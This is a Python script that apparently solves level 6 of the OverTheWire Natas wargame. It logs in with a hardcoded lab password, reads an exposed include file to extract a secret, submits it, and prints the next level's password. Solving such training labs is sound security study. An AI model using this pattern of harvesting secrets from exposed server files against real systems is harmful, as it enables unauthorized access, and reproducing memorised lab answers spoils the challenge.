#!/usr/bin/env python

#Importing Packages and Libraries
import requests
import re

#Declaring the Authentication
username = 'natas6'
password = 'fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR'
url = 'http://%s.natas.labs.overthewire.org/' %username

#Functions
session = requests.session()
response = session.get(url + "includes/secret.inc", auth = (username, password))
content = response.text
Code = (re.findall('"(.*)"', content)[0])

response1 = session.post(url, auth = (username, password), data = {"secret" : "%s" %Code, "submit" : "submit"})
content1 = response1.text

#Printing the Source Code
#print(content1)

#Printing only the Password
print(re.findall('natas7 is (.*)', content1)[0])